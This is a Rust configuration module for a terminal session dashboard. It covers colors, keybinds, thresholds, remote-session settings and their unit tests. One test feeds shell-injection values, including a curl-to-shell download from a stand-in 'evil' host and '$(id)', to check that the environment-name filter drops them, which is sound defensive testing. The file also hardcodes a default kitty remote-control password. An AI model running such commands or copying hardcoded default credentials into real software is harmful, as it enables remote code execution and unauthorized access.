//! The dashboard's configuration: the presentation sections (colors, ui,
//! thresholds, polling, keybinds) plus the launcher/debug sections it also reads,
//! which are reused from `cm-core`. Parses the same `config.toml` as the core
//! loader — serde ignores the sections each side doesn't know about.

use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, OnceLock, PoisonError, RwLock};
#[cfg(test)]
use std::sync::{Mutex, MutexGuard};

use ratatui::style::Color;
use serde::{Deserialize, Deserializer};

// The `[launcher]`/`[debug]` sections + the loader path + `debug_enabled` live in
// core (the launcher/daemon read them too). Re-exported so `config::LauncherConfig`
// / `config::debug_enabled()` resolve unchanged across the dashboard.
pub use cm_core::config::{DebugConfig, LauncherConfig, TomlLoad, config_path, debug_enabled};

static CONFIG: OnceLock<RwLock<Arc<Config>>> = OnceLock::new();

fn slot() -> &'static RwLock<Arc<Config>> {
    CONFIG.get_or_init(|| RwLock::new(Arc::new(Config::load())))
}

/// Read the in-memory config. Does not hit disk — call [`reload`] for that.
pub fn get() -> Arc<Config> {
    slot()
        .read()
        .unwrap_or_else(PoisonError::into_inner)
        .clone()
}

/// Re-read `config_path()` and merge `dashboard-overrides.json`.
#[allow(dead_code)] // watchers call this once they land
pub fn reload() -> Arc<Config> {
    reload_from(&config_path())
}

/// Re-read `path` into the process slot. Tests pass a tempfile; production
/// uses [`reload`].
#[allow(dead_code)] // see [`reload`]
pub fn reload_from(path: &Path) -> Arc<Config> {
    let mut cfg = Config::from_path(path);
    merge_dashboard_overrides(&mut cfg);
    let cfg = Arc::new(cfg);
    *slot().write().unwrap_or_else(PoisonError::into_inner) = Arc::clone(&cfg);
    cfg
}

/// Overlay `dashboard-overrides.json` onto a TOML-loaded config. Unknown or
/// missing files leave `cfg` unchanged.
fn merge_dashboard_overrides(cfg: &mut Config) {
    let path = cm_core::state::dashboard_overrides_path();
    let Ok(text) = std::fs::read_to_string(path) else {
        return;
    };
    let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let prefs = v.get("prefs");
    let layout = prefs
        .and_then(|p| p.get("sessions_layout"))
        .and_then(|x| x.as_str())
        .or_else(|| v.get("sessions_layout").and_then(|x| x.as_str()));
    if let Some(s) = layout
        && let Some(l) = crate::terminal::SessionsLayout::from_label(s)
    {
        cfg.terminal.sessions_layout = Some(l);
    }
    if let Some(s) = prefs
        .and_then(|p| p.get("on_window_close"))
        .and_then(|x| x.as_str())
    {
        cfg.remote.on_window_close = match s {
            "detach" => OnWindowClose::Detach,
            _ => OnWindowClose::Close,
        };
    }
    if let Some(b) = prefs
        .and_then(|p| p.get("pooled"))
        .and_then(|x| x.as_bool())
    {
        cfg.launcher.pooled = b;
    }
    if let Some(s) = prefs
        .and_then(|p| p.get("kitty_rc_password"))
        .and_then(|x| x.as_str())
    {
        cfg.kitty.rc_password = s.to_string();
    }
    if let Some(n) = prefs
        .and_then(|p| p.get("context_warning_tokens"))
        .and_then(|x| x.as_u64())
    {
        cfg.thresholds.context_warning_tokens = n;
    }
    if let Some(n) = prefs
        .and_then(|p| p.get("context_critical_tokens"))
        .and_then(|x| x.as_u64())
    {
        cfg.thresholds.context_critical_tokens = n;
    }
    if let Some(n) = prefs
        .and_then(|p| p.get("preview_auto_refresh_secs"))
        .and_then(|x| x.as_u64())
    {
        cfg.polling.preview_auto_refresh_secs = n;
    }
    if let Some(n) = prefs
        .and_then(|p| p.get("preview_stale_secs"))
        .and_then(|x| x.as_u64())
    {
        cfg.thresholds.preview_stale_secs = n;
    }
    let paint = |cfg: &mut Config, key: &str, set: fn(&mut Config, Color)| {
        if let Some(s) = prefs.and_then(|p| p.get(key)).and_then(|x| x.as_str())
            && let Some(c) = parse_color(s)
        {
            set(cfg, c);
        }
    };
    paint(cfg, "highlight_bg", |c, v| c.colors.ui.highlight_bg = v);
    paint(cfg, "selection_fg", |c, v| c.colors.ui.selection_fg = v);
    paint(cfg, "attention_fg", |c, v| c.colors.ui.attention_fg = v);
    paint(cfg, "error_fg", |c, v| c.colors.ui.error_fg = v);
}

/// Install an already-built Config (skips disk). Tests use [`ConfigSlotGuard`].
#[allow(dead_code)] // tests + later pref writes
pub fn replace(cfg: Config) -> Arc<Config> {
    replace_arc(Arc::new(cfg))
}

/// Swap the process slot. Returns the previous `Arc` so a guard can restore it.
#[allow(dead_code)] // [`ConfigSlotGuard`] and [`replace`]
pub fn replace_arc(cfg: Arc<Config>) -> Arc<Config> {
    let mut g = slot().write().unwrap_or_else(PoisonError::into_inner);
    std::mem::replace(&mut *g, cfg)
}

#[cfg(test)]
static CONFIG_SLOT_LOCK: Mutex<()> = Mutex::new(());

/// Serialises tests that mutate the process-global config slot and restores
/// the previous `Arc` on drop.
#[cfg(test)]
pub(crate) struct ConfigSlotGuard {
    prev: Arc<Config>,
    _lock: MutexGuard<'static, ()>,
}

#[cfg(test)]
impl ConfigSlotGuard {
    pub(crate) fn install(cfg: Config) -> Self {
        let lock = CONFIG_SLOT_LOCK
            .lock()
            .unwrap_or_else(PoisonError::into_inner);
        let prev = replace_arc(Arc::new(cfg));
        Self { prev, _lock: lock }
    }
}

#[cfg(test)]
impl Drop for ConfigSlotGuard {
    fn drop(&mut self) {
        let _ = replace_arc(Arc::clone(&self.prev));
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
pub struct Config {
    pub terminal: TerminalConfig,
    pub kitty: KittyConfig,
    pub colors: ColorsConfig,
    pub ui: UiConfig,
    pub thresholds: ThresholdsConfig,
    pub polling: PollingConfig,
    /// Behaviour of pooled (remote) sessions the dashboard holds a window for.
    pub remote: RemoteConfig,
    /// Reused from `cm-core` (the launcher/daemon read the same section).
    pub launcher: LauncherConfig,
    /// Reused from `cm-core`.
    pub debug: DebugConfig,
    /// Normal-mode keybinding overrides: `command-id → key | [keys]`. Empty by
    /// default (the dashboard uses its built-in bindings). Parsed into the live
    /// keymap by `app::keymap::Keymap::from_config`; see that module for the
    /// command ids and key syntax.
    pub keybinds: HashMap<String, KeyBinding>,
    /// Set by [`load`](Self::load) when the whole file failed to parse and every
    /// section fell back to defaults; `None` on a clean load. Skipped by serde
    /// (a load-time artifact, never a config key). The dashboard folds it into
    /// its startup status line — the TUI swallows stderr, so that's the only
    /// place the user would see it; headless callers (launcher/daemon) don't
    /// read it (their stderr/tracing is visible where they run).
    #[serde(skip)]
    pub load_warning: Option<String>,
}

/// One `[keybinds]` value: either a single key string (`kill = "x"`) or a list
/// of alternates (`next = ["j", "down", "ctrl+n"]`). An empty list unbinds the
/// command.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum KeyBinding {
    One(String),
    Many(Vec<String>),
}

impl KeyBinding {
    pub fn keys(&self) -> Vec<&str> {
        match self {
            KeyBinding::One(s) => vec![s.as_str()],
            KeyBinding::Many(v) => v.iter().map(String::as_str).collect(),
        }
    }
}

/// Floor for `event_poll_ms` — a user-set 0 flows into `event::poll`'s
/// duration and turns the main loop into a 100% CPU busy-spin, so clamp it.
const MIN_EVENT_POLL_MS: u64 = 10;

impl Config {
    fn load() -> Self {
        let mut cfg = Self::from_path(&config_path());
        merge_dashboard_overrides(&mut cfg);
        cfg
    }

    /// Load TOML from disk without touching the process slot (and without
    /// merging `dashboard-overrides.json` — callers that want the overlay
    /// apply it themselves, or go through [`reload`]).
    pub(crate) fn from_disk() -> Self {
        Self::from_path(&config_path())
    }

    fn from_path(path: &Path) -> Self {
        let mut cfg = match cm_core::config::load_toml_file::<Self>(path) {
            TomlLoad::Loaded(cfg) => cfg,
            TomlLoad::Absent => Self::default(),
            // The whole file reverted to defaults — including [keybinds],
            // colors, and the kitty rc_password. Carry the reason so the
            // dashboard can surface it in its status line (see field doc);
            // `load_toml_file` has already logged it.
            TomlLoad::Failed(e) => Self {
                load_warning: Some(format!("config.toml failed to parse (using defaults): {e}")),
                ..Self::default()
            },
        };
        cfg.normalize();
        cfg
    }

    /// Clamp values that would misbehave at their extremes back into a safe
    /// range, leaving everything else (including the defaults) untouched.
    fn normalize(&mut self) {
        self.polling.event_poll_ms = self.polling.event_poll_ms.max(MIN_EVENT_POLL_MS);
        // The dashboard is the tab-title consumer, so it deserializes its own
        // copy of `[launcher]` — apply the same legacy-title migration the core
        // loader runs (see `LauncherConfig::migrate_legacy_titles`).
        self.launcher.migrate_legacy_titles();
    }
}

// =============================================================================
// terminal
// =============================================================================

/// Kitty-specific knobs stay under `[kitty]`.
///
/// There is deliberately no `backend` key: auto-detect
/// ([`crate::terminal::detect_backend`]) is the only mechanism, and a key that
/// merely *validated* was worse than none — `Config::from_path` turns any parse
/// error into a whole-file fallback, so a typo'd backend discarded the user's
/// colors, keybinds and `rc_password` for a setting nothing read. Dropping the
/// field is what keeps an older file loading: `Config` has no
/// `deny_unknown_fields`, so serde ignores a leftover `backend` outright.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
pub struct TerminalConfig {
    /// Initial session layout: `"stacked"` or `"per-tab"`. Unset ⇒ stacked.
    /// Dashboard overrides win over this value.
    pub sessions_layout: Option<crate::terminal::SessionsLayout>,
}

/// Which terminal the dashboard is driving — the result of
/// [`crate::terminal::detect_backend`], never a config value.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfiguredBackend {
    Kitty,
    Zellij,
    Tmux,
    /// macOS only — the Linux Ghostty exposes no control channel at all.
    Ghostty,
    /// macOS only. Detection already prefers iTerm2 over Kitty when
    /// `TERM_PROGRAM` says so, so a stale inherited `KITTY_WINDOW_ID` does not
    /// win (`cm_core::terminal::resolve_terminal_env`).
    Iterm,
}

// =============================================================================
// remote
// =============================================================================

/// Drop any `inherit_env` entry that isn't a valid env var name, warning once
/// per reject.
///
/// A malformed entry is skipped rather than failing the parse: this loader
/// falls back to [`Config::default`] on any error, so rejecting the file would
/// silently discard the user's *whole* config over one bad name. Dropping the
/// entry keeps the blast radius to the name itself, and the warning says which.
fn deserialize_env_names<'de, D>(de: D) -> Result<Vec<String>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let names = Vec::<String>::deserialize(de)?;
    Ok(names
        .into_iter()
        .filter(|n| {
            let ok = cm_core::config::is_valid_env_name(n);
            if !ok {
                tracing::warn!(
                    "ignoring [remote] inherit_env entry {n:?}: not an environment \
                     variable name ([A-Za-z_][A-Za-z0-9_]*)"
                );
            }
            ok
        })
        .collect())
}

/// `[remote]` in `config.toml`: knobs for sessions this dashboard reaches over
/// a `miao-server` (ssh or pooled-localhost).
///
/// Declared here rather than in `cm-core` because the dashboard is the only
/// reader — a host-side `config.toml` setting either key does nothing. See that
/// module's doc on why the declaring crate is not what decides which machine
/// supplies a value.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
pub struct RemoteConfig {
    /// What closing a pooled session's window means. See [`OnWindowClose`].
    pub on_window_close: OnWindowClose,
    /// Names of environment variables a pooled session should **inherit from
    /// the remote host** it runs on. libshpool's pty pool starts every session
    /// with a scrubbed environment (`env_clear`), so a container-level secret
    /// like `ANTHROPIC_API_KEY` — present for a plain interactive shell —
    /// otherwise never reaches the agent. Each name here is threaded to
    /// `miao-server attach` (`--inherit-env`), which hands it to libshpool's
    /// `forward_env`: the value is read live from the attach process's own
    /// environment on the host — never the dashboard's — and injected into the
    /// session at the moment the session is **created**.
    ///
    /// Empty by default — opt in per var, since forwarding a secret is a
    /// deliberate act, and note what that act costs: libshpool's daemon writes
    /// every forwarded name and **value** to `$SHPOOL_SESSION_DIR/forward.env`
    /// on the host, in cleartext, on every attach — `0644`, and on the ssh path
    /// the `sessions/` dir above it stays `0755` as well, because libshpool only
    /// hardens it when the attach client has an `SSH_AUTH_SOCK` to link and our
    /// attach has none. See `docs/remote-sessions.md`.
    ///
    /// Entries are filtered to `[A-Za-z_][A-Za-z0-9_]*` on load — see
    /// [`cm_core::config::is_valid_env_name`] for why that check is a security
    /// boundary and not tidiness.
    #[serde(deserialize_with = "deserialize_env_names")]
    pub inherit_env: Vec<String>,
}

/// `[remote] on_window_close`: what to do with the session behind a window the
/// **user** closed.
///
/// Only a deliberate close reaches this. A window that goes away because its
/// attach died — a dropped ssh, a laptop resuming to a dead link, a refused
/// attach — always detaches, since the session is the thing that survived the
/// failure and killing it would turn every flaky link into lost work. The two
/// are told apart by the exit status the wrapper reports: 129 (128 + SIGHUP) is
/// the terminal tearing the window down under a live attach; ssh's 255 and an
/// in-session detach's 0 are not.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum OnWindowClose {
    /// End the session on its host, as `x` would. The default: a window closed
    /// by hand reads as "I'm done with this", and the alternative leaves a
    /// pooled session running with nothing showing it.
    #[default]
    Close,
    /// Leave the session running, detached — `D`'s behaviour, for every close.
    Detach,
}

// =============================================================================
// kitty
// =============================================================================

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct KittyConfig {
    pub rc_password: String,
}

impl Default for KittyConfig {
    fn default() -> Self {
        Self {
            rc_password: "i-am-the-captain-miao".to_string(),
        }
    }
}

// =============================================================================
// colors
// =============================================================================

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
pub struct ColorsConfig {
    pub ui: UiColors,
    pub picker: PickerColors,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct UiColors {
    #[serde(deserialize_with = "de_color")]
    pub title_fg: Color,
    #[serde(deserialize_with = "de_color")]
    pub header_fg: Color,
    #[serde(deserialize_with = "de_color")]
    pub attention_fg: Color,
    #[serde(deserialize_with = "de_color")]
    pub error_fg: Color,
    #[serde(deserialize_with = "de_color")]
    pub highlight_bg: Color,
    #[serde(deserialize_with = "de_color")]
    pub selection_fg: Color,
    /// The session table's cursor marker. Its **display width is the gutter
    /// width** — ratatui reserves exactly `highlight_symbol.width()` and carves
    /// that area out before the spaced column layout runs, so `column_spacing`
    /// never applies between it and the first column. Whatever follows the
    /// symbol is painted right up against it.
    ///
    /// The trailing space in the default is therefore **overhang room, not
    /// padding**. `override_indicator_spans` can hold the glyph set it does
    /// because every one of them paints within its measured width; this field is
    /// open config, so the symbol is the one glyph in that gutter no invariant
    /// can reach. `❯` U+276F measures 1 and many fonts draw it wider, and
    /// without the space the next cell's glyph overpaints its point — leaving a
    /// cursor that no longer reads as pointing at anything. One reserved cell
    /// buys immunity to that for any symbol a user picks.
    pub selection_symbol: String,
}

impl Default for UiColors {
    fn default() -> Self {
        Self {
            title_fg: Color::Cyan,
            header_fg: Color::Cyan,
            attention_fg: Color::Yellow,
            error_fg: Color::Red,
            highlight_bg: Color::DarkGray,
            selection_fg: Color::Blue,
            selection_symbol: "\u{276F} ".to_string(),
        }
    }
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct PickerColors {
    #[serde(deserialize_with = "de_color")]
    pub highlight_bg: Color,
    #[serde(deserialize_with = "de_color")]
    pub chevron_fg: Color,
}

impl Default for PickerColors {
    fn default() -> Self {
        Self {
            highlight_bg: Color::DarkGray,
            chevron_fg: Color::Blue,
        }
    }
}

// =============================================================================
// ui
// =============================================================================

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default)]
pub struct UiConfig {
    pub panels: PanelsConfig,
    pub table: TableConfig,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct PanelsConfig {
    pub preview_auto_min_height: u16,
    pub detail_auto_min_width: u16,
    pub detail_default_width: u16,
    /// At or below this body width the dashboard drops the side-by-side layout
    /// for a vertical stack (session list → detail → preview) with a trimmed
    /// session table and a compact detail panel.
    pub narrow_max_width: u16,
}

impl Default for PanelsConfig {
    fn default() -> Self {
        Self {
            preview_auto_min_height: 16,
            detail_auto_min_width: 70,
            detail_default_width: 36,
            narrow_max_width: 90,
        }
    }
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct TableConfig {
    pub name_truncate: usize,
}

impl Default for TableConfig {
    fn default() -> Self {
        Self { name_truncate: 35 }
    }
}

// =============================================================================
// thresholds
// =============================================================================

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct ThresholdsConfig {
    pub context_warning_tokens: u64,
    pub context_critical_tokens: u64,
    /// Show an "updated Ns ago" label in the preview panel's title once the
    /// displayed content is older than this. 0 shows it whenever content is
    /// present.
    pub preview_stale_secs: u64,
}

impl Default for ThresholdsConfig {
    fn default() -> Self {
        Self {
            context_warning_tokens: 175_000,
            context_critical_tokens: 400_000,
            preview_stale_secs: 20,
        }
    }
}

// =============================================================================
// polling
// =============================================================================

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct PollingConfig {
    pub fs_reload_debounce_ms: u64,
    pub preview_debounce_ms: u64,
    pub event_poll_ms: u64,
    /// Re-fetch the preview panel every this many seconds while the
    /// dashboard's terminal window has focus and the preview isn't
    /// scrolled. 0 disables the auto-refresh.
    pub preview_auto_refresh_secs: u64,
}

impl Default for PollingConfig {
    fn default() -> Self {
        Self {
            fs_reload_debounce_ms: 100,
            preview_debounce_ms: 200,
            event_poll_ms: 100,
            preview_auto_refresh_secs: 10,
        }
    }
}

// =============================================================================
// color parsing
// =============================================================================

fn de_color<'de, D: Deserializer<'de>>(d: D) -> Result<Color, D::Error> {
    let s = String::deserialize(d)?;
    parse_color(&s).ok_or_else(|| serde::de::Error::custom(format!("invalid color: {s}")))
}

pub(crate) fn parse_color(s: &str) -> Option<Color> {
    if let Some(hex) = s.strip_prefix('#') {
        // Guard on ASCII too: `hex.len()` is a byte count, so a multibyte
        // char (e.g. `#aé234`) can pass the length check and then panic when
        // sliced on a non-char boundary below.
        if hex.len() != 6 || !hex.is_ascii() {
            return None;
        }
        let r = u8::from_str_radix(&hex[0..2], 16).ok()?;
        let g = u8::from_str_radix(&hex[2..4], 16).ok()?;
        let b = u8::from_str_radix(&hex[4..6], 16).ok()?;
        return Some(Color::Rgb(r, g, b));
    }
    match s.to_ascii_lowercase().as_str() {
        "reset" => Some(Color::Reset),
        "black" => Some(Color::Black),
        "red" => Some(Color::Red),
        "green" => Some(Color::Green),
        "yellow" => Some(Color::Yellow),
        "blue" => Some(Color::Blue),
        "magenta" | "purple" => Some(Color::Magenta),
        "cyan" => Some(Color::Cyan),
        "gray" | "grey" => Some(Color::Gray),
        "dark_gray" | "dark-gray" | "darkgray" | "dark_grey" | "darkgrey" => Some(Color::DarkGray),
        "light_red" | "lightred" => Some(Color::LightRed),
        "light_green" | "lightgreen" => Some(Color::LightGreen),
        "light_yellow" | "lightyellow" => Some(Color::LightYellow),
        "light_blue" | "lightblue" => Some(Color::LightBlue),
        "light_magenta" | "lightmagenta" => Some(Color::LightMagenta),
        "light_cyan" | "lightcyan" => Some(Color::LightCyan),
        "white" => Some(Color::White),
        _ => None,
    }
}

pub(crate) fn format_color(c: Color) -> String {
    match c {
        Color::Reset => "reset".into(),
        Color::Black => "black".into(),
        Color::Red => "red".into(),
        Color::Green => "green".into(),
        Color::Yellow => "yellow".into(),
        Color::Blue => "blue".into(),
        Color::Magenta => "magenta".into(),
        Color::Cyan => "cyan".into(),
        Color::Gray => "gray".into(),
        Color::DarkGray => "dark_gray".into(),
        Color::LightRed => "light_red".into(),
        Color::LightGreen => "light_green".into(),
        Color::LightYellow => "light_yellow".into(),
        Color::LightBlue => "light_blue".into(),
        Color::LightMagenta => "light_magenta".into(),
        Color::LightCyan => "light_cyan".into(),
        Color::White => "white".into(),
        Color::Rgb(r, g, b) => format!("#{r:02x}{g:02x}{b:02x}"),
        Color::Indexed(i) => format!("{i}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn keybinds_table_parses_string_and_list_forms() {
        let toml = r#"
            [keybinds]
            kill = "X"
            next = ["j", "down", "ctrl+n"]
            help = []
        "#;
        let cfg: Config = toml::from_str(toml).unwrap();
        assert_eq!(cfg.keybinds["kill"].keys(), vec!["X"]);
        assert_eq!(cfg.keybinds["next"].keys(), vec!["j", "down", "ctrl+n"]);
        assert!(cfg.keybinds["help"].keys().is_empty());
    }

    #[test]
    fn keybinds_default_is_empty() {
        let cfg: Config = toml::from_str("").unwrap();
        assert!(cfg.keybinds.is_empty());
    }

    #[test]
    fn remote_inherit_env_parses() {
        let cfg: Config =
            toml::from_str("[remote]\ninherit_env = [\"ANTHROPIC_API_KEY\", \"OPENAI_API_KEY\"]\n")
                .unwrap();
        assert_eq!(
            cfg.remote.inherit_env,
            ["ANTHROPIC_API_KEY", "OPENAI_API_KEY"]
        );
    }

    #[test]
    fn remote_inherit_env_defaults_empty() {
        let cfg = Config::default();
        assert!(cfg.remote.inherit_env.is_empty());
    }

    /// The shapes that would otherwise be remote command execution (ssh hands
    /// the joined argv to a login shell) or an unparseable `forward_env` TOML
    /// (which fails the whole attach). Dropped per-entry, so the valid names
    /// beside them still load.
    #[test]
    fn remote_inherit_env_drops_shell_unsafe_names() {
        let cfg: Config = toml::from_str(
            "[remote]\ninherit_env = [\"GOOD\", \"X; curl http://evil/p|sh\", \"TWO WORDS\", \"$(id)\", \"ALSO_GOOD\"]\n",
        )
        .unwrap();
        assert_eq!(cfg.remote.inherit_env, ["GOOD", "ALSO_GOOD"]);
    }

    #[test]
    fn parse_color_forms() {
        use ratatui::style::Color;
        // Named colors, case-insensitive, including aliases.
        assert_eq!(parse_color("red"), Some(Color::Red));
        assert_eq!(parse_color("Red"), Some(Color::Red));
        assert_eq!(parse_color("purple"), Some(Color::Magenta));
        assert_eq!(parse_color("grey"), Some(Color::Gray));
        assert_eq!(parse_color("dark-gray"), Some(Color::DarkGray));
        assert_eq!(parse_color("reset"), Some(Color::Reset));
        // #rrggbb, upper and lower hex.
        assert_eq!(parse_color("#ff8800"), Some(Color::Rgb(0xff, 0x88, 0x00)));
        assert_eq!(parse_color("#FF8800"), Some(Color::Rgb(0xff, 0x88, 0x00)));
        // Rejections: wrong length, the non-ASCII panic guard (`#aé234` is 6
        // *bytes* so it clears the length check), and an unknown name.
        assert_eq!(parse_color("#12345"), None);
        assert_eq!(parse_color("#aé234"), None);
        assert_eq!(parse_color("notacolor"), None);
    }

    #[test]
    fn format_color_round_trips_named_and_rgb() {
        use ratatui::style::Color;
        assert_eq!(format_color(Color::DarkGray), "dark_gray");
        assert_eq!(format_color(Color::Blue), "blue");
        assert_eq!(format_color(Color::Rgb(0xff, 0x88, 0x00)), "#ff8800");
        assert_eq!(
            parse_color(&format_color(Color::DarkGray)),
            Some(Color::DarkGray)
        );
        assert_eq!(
            parse_color(&format_color(Color::Rgb(0x0a, 0x0b, 0x0c))),
            Some(Color::Rgb(0x0a, 0x0b, 0x0c))
        );
    }

    #[test]
    fn get_reads_the_slot_without_reload() {
        let mut cfg = Config::default();
        cfg.ui.table.name_truncate = 77;
        let _guard = ConfigSlotGuard::install(cfg);
        assert_eq!(get().ui.table.name_truncate, 77);
        let mut other = Config::default();
        other.ui.table.name_truncate = 12;
        let _ = replace(other);
        assert_eq!(get().ui.table.name_truncate, 12);
    }
}
